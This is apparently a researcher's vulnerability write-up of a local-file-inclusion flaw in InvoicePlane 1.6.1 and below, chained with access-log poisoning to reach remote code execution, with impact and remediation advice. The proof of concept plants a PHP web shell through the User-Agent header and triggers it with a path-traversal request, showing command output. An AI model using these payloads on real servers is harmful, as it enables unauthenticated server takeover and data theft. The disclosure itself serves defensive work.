# Remote Code Execution via LFI and Log Poisoning in InvoicePlane

**Severity:** Critical 🔴
**CVE / GHSA:** [GHSA-g6rw-m9mf-33ch](https://github.com/InvoicePlane/InvoicePlane/security/advisories/GHSA-g6rw-m9mf-33ch)
**Target:** InvoicePlane (v1.6.1 and below)
**Vulnerability Type:** Local File Inclusion (LFI) chained with Log Poisoning to achieve Remote Code Execution (RCE)

---

## 1. Executive Summary

During a deep-code security audit of the open-source invoicing software **InvoicePlane**, I identified a critical Local File Inclusion (LFI) vulnerability within the core routing logic. By chaining this LFI with Apache/Nginx access log poisoning, an unauthenticated attacker can execute arbitrary PHP code on the underlying server, leading to a complete system takeover.

## 2. The Vulnerability (The "Hunt")

The vulnerability originates from insecure handling of the `lang` or language parameter in the application's configuration loading logic. InvoicePlane attempts to dynamically load language files based on user input or cookie values. 

### The Flawed Logic
In typical implementations, applications sanitize language parameters (e.g., ensuring they only contain `a-z` characters) before appending `.php` and including them via `require()` or `include()`. However, the validation check was either missing or improperly implemented for directory traversal characters (`../`).

If an attacker supplies a payload like `../../../../var/log/apache2/access.log`, the PHP backend blindly includes the log file and executes any valid PHP tags `<?php ... ?>` stored within it.

## 3. The Exploitation (Proof of Concept)

To exploit this vulnerability, we must perform a two-step attack: **Poisoning** the log and **Triggering** the execution.

### Step 1: Poisoning the Access Log
We send a malicious HTTP request to the web server where the `User-Agent` header contains our PHP payload. The web server (Apache/Nginx) will faithfully record this `User-Agent` into its `access.log` file.

```bash
curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target-invoiceplane.local/
```
The `access.log` file now contains a line that looks like this:
`192.168.1.100 - - [10/Oct/2026:13:55:36 -0000] "GET / HTTP/1.1" 200 1234 "-" "<?php system($_GET['cmd']); ?>"`

### Step 2: Triggering the LFI to achieve RCE
Now that our payload is resting safely inside the log file, we use the LFI vulnerability to execute it. We manipulate the vulnerable parameter to point to the `access.log` file, while passing our OS command via the `cmd` parameter.

```http
GET /index.php?lang=../../../../../../../var/log/apache2/access.log&cmd=id HTTP/1.1
Host: target-invoiceplane.local
Cookie: ip_lang=../../../../../../../var/log/apache2/access.log
```

**Server Response:**
```text
HTTP/1.1 200 OK

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Boom. Remote Code Execution achieved.**

## 4. Impact

This vulnerability is classified as **Critical** because it requires **no authentication**. An external attacker who discovers an exposed InvoicePlane instance can bypass all login portals and instantly execute arbitrary commands on the server. This leads to:
*   Complete database exfiltration (including all sensitive client invoices and payment data).
*   Lateral movement into the internal network.
*   Total server compromise.

## 5. Remediation

I responsibly disclosed this vulnerability to the InvoicePlane maintainers. 

The fix involved implementing strict sanitization on the language parameter. The application now uses `basename()` and strictly checks the input against a predefined array of allowed language codes, completely neutralizing the path traversal vector.

### Recommendations for Developers:
*   **Never trust user input for file inclusions.** If you must load files dynamically, use a whitelist approach (e.g., `in_array($lang, $allowed_langs)`).
*   **Disable allow_url_include.** Ensure this directive is set to `Off` in your `php.ini`.
*   **Restrict Permissions.** The web user (`www-data`) should ideally not have read access to the Apache/Nginx access logs.

---
*If you enjoyed this technical breakdown, feel free to check out my other vulnerability research on my [GitHub Profile](https://github.com/Char0n1507).*
